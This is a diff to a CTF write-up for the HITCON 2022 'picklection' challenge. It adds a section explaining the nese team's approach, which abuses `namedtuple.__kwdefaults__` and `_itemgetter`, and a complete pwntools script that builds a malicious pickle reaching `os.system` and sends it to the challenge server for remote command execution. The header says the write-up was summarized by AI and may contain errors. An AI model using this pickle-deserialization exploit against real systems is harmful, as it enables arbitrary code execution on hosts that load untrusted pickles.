@@ -1,6 +1,6 @@
 # HITCON 2022 picklection
 
-> Summarized by AI from the [HITCON 2022 organizers' writeup](https://hackmd.io/@94y7q597ST2hNdB9lbTJhA/SkCri-pOs) and [splitline's writeup](https://blog.splitline.tw/hitcon-ctf-2022/#%F0%9F%A5%92-picklection-misc) ([exploit](https://github.com/splitline/My-CTF-Challenges/blob/master/hitcon-quals/2022/misc/Picklection/exp/exploit.py)). May contain errors. This challenge uses Python 3.9.13. Challenge archive [here](https://github.com/hitconctf/ctf2022.hitcon.org/releases/download/archive/picklection-0e1ebbc615be72e9c738f3d0c1aad19a95ae000a.zip).
+> Summarized by AI from the [HITCON 2022 organizers' writeup](https://hackmd.io/@94y7q597ST2hNdB9lbTJhA/SkCri-pOs), [splitline's writeup](https://blog.splitline.tw/hitcon-ctf-2022/#%F0%9F%A5%92-picklection-misc) ([exploit](https://github.com/splitline/My-CTF-Challenges/blob/master/hitcon-quals/2022/misc/Picklection/exp/exploit.py)), and the [nese team's writeup](https://nese.team/writeup/hitcon2022.pdf). May contain errors. This challenge uses Python 3.9.13. Challenge archive [here](https://github.com/hitconctf/ctf2022.hitcon.org/releases/download/archive/picklection-0e1ebbc615be72e9c738f3d0c1aad19a95ae000a.zip).
 
 ```python
 #!/usr/local/bin/python3
@@ -360,6 +360,139 @@ pb.emit_build_slotstate(pb.get_memo('abc'),
 pb.p += pb.stack_global('collections', 'tuple') + P.POP
 pb.p += pb.get_memo('namedtuple') + pb.mark()
 pb.p += pb.short_binunicode('x') + P.EMPTY_TUPLE
+pb.p += pb.tuple_op() + pb.reduce() + pb.none() + pb.stop()
+
+r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
+r.sendline(pb.p.hex().encode())
+print(r.recvall(timeout=3).decode(errors='replace'))
+```
+
+## Approach D: `_itemgetter` + `namedtuple.__kwdefaults__` (nese team)
+
+**How it works:**
+
+From the [nese team's writeup](https://nese.team/writeup/hitcon2022.pdf). The trick: `list(map(str, field_names))` and `tuple(map(_sys.intern, field_names))` use different overrides for `list` and `tuple`, so validation sees a benign name while the payload goes to `eval`.
+
+1. Create `ig2 = _itemgetter(2)`, `ig3 = _itemgetter(3)`. These extract specific indices from sequences.
+2. Build a `defaults` list `['', '', ['z'], [payload]]` and set `namedtuple.__kwdefaults__` so a subsequent `namedtuple('b', ['b1','b2','b3','b4'])` uses them.
+3. Create `tuple2 = namedtuple('b', ['b1','b2','b3','b4'])` — a namedtuple with 4 fields where the last 2 have defaults `['z']` and `[payload]`.
+4. Replace `collections.map` → `tuple2`, `collections.list` → `_itemgetter(2)`, `collections.tuple` → `_itemgetter(3)` via `_collections_abc.__all__`.
+
+Inside `namedtuple('a', [])`:
+- `list(map(str, field_names))` → `_itemgetter(2)(tuple2(str, []))` → `['z']` (passes validation)
+- `tuple(map(_sys.intern, field_names))` → `_itemgetter(3)(tuple2(sys.intern, ['z']))` → `[payload]`
+- `arg_list = payload` → `lambda _cls, z=EXPLOIT:0` — eval executes the default argument
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import pickle, struct
+
+context.log_level = 'error'
+HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
+CMD = sys.argv[3] if len(sys.argv) > 3 else 'id'
+
+P = pickle
+
+class PickleBuilder:
+    def __init__(self):
+        self.p = P.PROTO + b'\x04'; self.memos = {}; self.next_memo = 0
+    def short_binunicode(self, s):
+        data = s.encode('utf-8'); assert len(data) < 256
+        return P.SHORT_BINUNICODE + bytes([len(data)]) + data
+    def stack_global(self, m, n):
+        return self.short_binunicode(m) + self.short_binunicode(n) + P.STACK_GLOBAL
+    def memoize(self):
+        idx = self.next_memo; self.next_memo += 1
+        return P.MEMOIZE, idx
+    def binget(self, idx):
+        return P.BINGET + bytes([idx]) if idx < 256 else P.LONG_BINGET + struct.pack('<I', idx)
+    def emit_global(self, m, n, save_as=None):
+        b = self.stack_global(m, n)
+        if save_as is not None:
+            mb, idx = self.memoize(); b += mb; self.memos[save_as] = idx
+        self.p += b
+    def get_memo(self, k): return self.binget(self.memos[k])
+    def mark(self): return P.MARK
+    def list_op(self): return P.LIST
+    def tuple_op(self): return P.TUPLE
+    def tuple2(self): return P.TUPLE2
+    def reduce(self): return P.REDUCE
+    def none(self): return P.NONE
+    def stop(self): return P.STOP
+    def pop(self): return P.POP
+    def empty_dict(self): return P.EMPTY_DICT
+    def dict_op(self): return P.DICT
+    def build(self): return P.BUILD
+
+pb = PickleBuilder()
+pb.emit_global('collections', 'namedtuple', save_as='nt')
+pb.emit_global('collections', '_itemgetter', save_as='ig')
+pb.emit_global('collections', '_collections_abc', save_as='abc')
+
+# _itemgetter(2) and _itemgetter(3)
+pb.p += pb.get_memo('ig') + pb.mark() + P.BININT1 + b'\x02' + pb.tuple_op() + pb.reduce() + pb.memoize()[0]
+ig2 = pb.next_memo - 1
+pb.p += pb.get_memo('ig') + pb.mark() + P.BININT1 + b'\x03' + pb.tuple_op() + pb.reduce() + pb.memoize()[0]
+ig3 = pb.next_memo - 1
+
+# defaults: ['', '', ['z'], [payload]]
+payload_str = f"z=[].__str__.__objclass__.__subclasses__()[80].acquire.__globals__['sys'].modules['os'].system('{CMD}'):0#"
+pb.p += pb.mark()
+pb.p += pb.short_binunicode('') + pb.short_binunicode('')
+pb.p += pb.mark() + pb.short_binunicode('z') + pb.list_op()
+pb.p += pb.mark() + pb.short_binunicode(payload_str) + pb.list_op()
+pb.p += pb.list_op() + pb.memoize()[0]
+dlist = pb.next_memo - 1
+
+# __kwdefaults__ dict
+pb.p += pb.mark()
+pb.p += pb.short_binunicode('defaults') + pb.binget(dlist)
+pb.p += pb.short_binunicode('rename') + P.FALSE
+pb.p += pb.short_binunicode('module') + P.NONE
+pb.p += pb.dict_op() + pb.memoize()[0]
+kw_idx = pb.next_memo - 1
+
+# setattr(namedtuple, "__kwdefaults__", kw_dict) via BUILD slotstate
+pb.p += pb.get_memo('nt') + pb.empty_dict() + pb.mark()
+pb.p += pb.short_binunicode('__kwdefaults__') + pb.binget(kw_idx)
+pb.p += pb.dict_op() + pb.tuple2() + pb.build() + pb.pop()
+
+# tuple2 = namedtuple('b', ['b1','b2','b3','b4'])
+pb.p += pb.get_memo('nt') + pb.mark()
+pb.p += pb.short_binunicode('b')
+pb.p += pb.mark() + pb.short_binunicode('b1') + pb.short_binunicode('b2') + pb.short_binunicode('b3') + pb.short_binunicode('b4') + pb.list_op()
+pb.p += pb.tuple_op() + pb.reduce() + pb.memoize()[0]
+tuple2 = pb.next_memo - 1
+
+# Modify _collections_abc
+pb.p += pb.get_memo('abc') + pb.empty_dict() + pb.mark()
+pb.p += pb.short_binunicode('__all__')
+pb.p += pb.mark() + pb.short_binunicode('map') + pb.short_binunicode('list') + pb.short_binunicode('tuple') + pb.list_op()
+pb.p += pb.dict_op() + pb.tuple2() + pb.build() + pb.pop()
+for attr, val in [('map', tuple2), ('list', ig2), ('tuple', ig3)]:
+    pb.p += pb.get_memo('abc') + pb.empty_dict() + pb.mark()
+    pb.p += pb.short_binunicode(attr) + pb.binget(val)
+    pb.p += pb.dict_op() + pb.tuple2() + pb.build() + pb.pop()
+
+# Trigger __getattr__ for map, list, tuple
+for name in ['map', 'list', 'tuple']:
+    pb.p += pb.stack_global('collections', name) + pb.pop()
+
+# Reset __kwdefaults__['defaults'] = None
+pb.p += pb.mark()
+pb.p += pb.short_binunicode('defaults') + P.NONE
+pb.p += pb.short_binunicode('rename') + P.FALSE
+pb.p += pb.short_binunicode('module') + P.NONE
+pb.p += pb.dict_op() + pb.memoize()[0]
+pb.p += pb.get_memo('nt') + pb.empty_dict() + pb.mark()
+pb.p += pb.short_binunicode('__kwdefaults__') + pb.binget(pb.next_memo - 1)
+pb.p += pb.dict_op() + pb.tuple2() + pb.build() + pb.pop()
+
+# namedtuple('a', []) — triggers RCE
+pb.p += pb.get_memo('nt') + pb.mark()
+pb.p += pb.short_binunicode('a') + pb.mark() + pb.list_op()
 pb.p += pb.tuple_op() + pb.reduce() + pb.none() + pb.stop()
 
 r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
